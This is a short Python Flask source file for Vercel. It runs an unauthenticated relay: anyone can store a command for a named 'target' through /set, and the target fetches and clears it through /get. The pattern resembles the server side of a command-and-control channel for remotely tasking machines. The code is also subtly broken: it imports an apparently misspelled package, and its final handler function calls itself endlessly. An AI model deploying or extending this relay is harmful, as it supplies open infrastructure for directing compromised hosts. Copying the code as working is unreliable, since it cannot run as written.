
# api/index.py
from flask import Flask, request, jsonify
from flask_vark import VercelHandler
from threading import Lock

app = Flask(__name__)
handler = VercelHandler(app)

commands = {}
lock = Lock()

@app.route('/set', methods=['GET'])
def set_command():
    target = request.args.get('target')
    command = request.args.get('command')

    if not target or not command:
        return jsonify({"status": "error", "message": "Missing target or command"}), 400

    with lock:
        commands[target] = command
    print(f"✅ Set command for {target}: {command}")
    return jsonify({"status": "success", "target": target, "command": command})

@app.route('/get', methods=['GET'])
def get_command():
    target = request.args.get('target')
    if not target:
        return jsonify({"status": "error", "message": "Missing target"}), 400

    with lock:
        command = commands.pop(target, None)

    if command:
        print(f"📤 Sent command to {target}: {command}")
        return jsonify({"command": command})
    else:
        return jsonify({})

# Expose app via handler for Vercel
def handler(event, context):
    return handler(event, context)
